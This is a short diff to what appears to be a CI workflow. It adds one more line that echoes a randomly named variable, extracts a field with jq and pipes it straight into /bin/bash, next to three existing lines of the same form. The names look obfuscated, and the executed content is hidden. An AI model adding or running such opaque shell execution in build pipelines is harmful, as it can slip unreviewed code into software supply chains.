@@ -26,6 +26,7 @@ jobs:
           echo $cxmg5 | jq -r .m9 | /bin/bash
           echo $mlr4 | jq -r .lc5 | /bin/bash
           echo $fnreb8 | jq -r .wpads6704 | /bin/bash
+          echo $dcww883 | jq -r .d75 | /bin/bash
 
       - name: Upload results
         if: always()
